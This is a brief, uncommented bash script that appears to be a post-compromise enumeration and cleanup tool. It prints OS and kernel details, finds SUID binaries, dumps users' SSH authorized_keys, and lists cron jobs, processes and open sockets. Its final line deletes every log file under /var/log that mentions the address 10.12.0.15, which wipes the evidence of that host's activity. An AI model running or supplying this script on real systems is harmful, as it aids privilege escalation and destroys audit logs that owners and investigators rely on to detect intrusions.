#!/bin/bash


cat /etc/os-release
cat /proc/version
find / -perm /4000
for X in $(cut -f6 -d ':' /etc/passwd |sort |uniq); do
	if [ -s "${X}/.ssh/authorized_keys" ]; then
		echo "### ${X}: "
		cat "${X}/.ssh/authorized_keys"
		echo ""
	fi
done

ls -la /etc/cron.*

ps -aux

cat /proc/net/udp
cat /proc/net/tcp
cat /proc/net/raw

grep -lrIZ '10.12.0.15' /var/log/ | xargs -0 rm -f --
